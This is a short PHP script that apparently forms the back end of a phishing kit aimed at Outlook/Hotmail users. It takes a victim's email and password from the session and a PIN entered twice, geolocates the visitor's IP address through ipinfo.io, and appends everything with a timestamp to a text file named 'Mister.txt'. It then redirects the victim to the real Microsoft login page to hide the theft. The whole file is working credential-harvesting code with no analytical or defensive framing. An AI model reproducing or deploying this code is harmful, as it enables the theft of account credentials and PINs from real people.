<?php
session_start();
date_default_timezone_set('America/Bogota');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$ct = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
if(isset($_POST["passPIN"]) && isset($_POST["passPIN2"])){
	

	
	$file = fopen("Mister.txt", "a");
fwrite($file, "Correo: ".$_SESSION['c1']."\r\nPsswrd: ".$_SESSION['c2']."\r\nPin: ".$_POST['passPIN']."\r\nRepin: ".$_POST['passPIN2']."\r\nFecha: ".date('d-m-Y')." | ".date('H:i:s')."\r\n".$cc." ".$ct." ".$userp." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);
unset ($_SESSION['c1']);
unset ($_SESSION['c2']);

	echo "<script>";
	echo "window.location.href='https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1604109490&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d1aeb88ff-fb3d-8b93-b6a2-7a3d1ba8e33c&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';";
	echo "</script>";
	

}
	
?>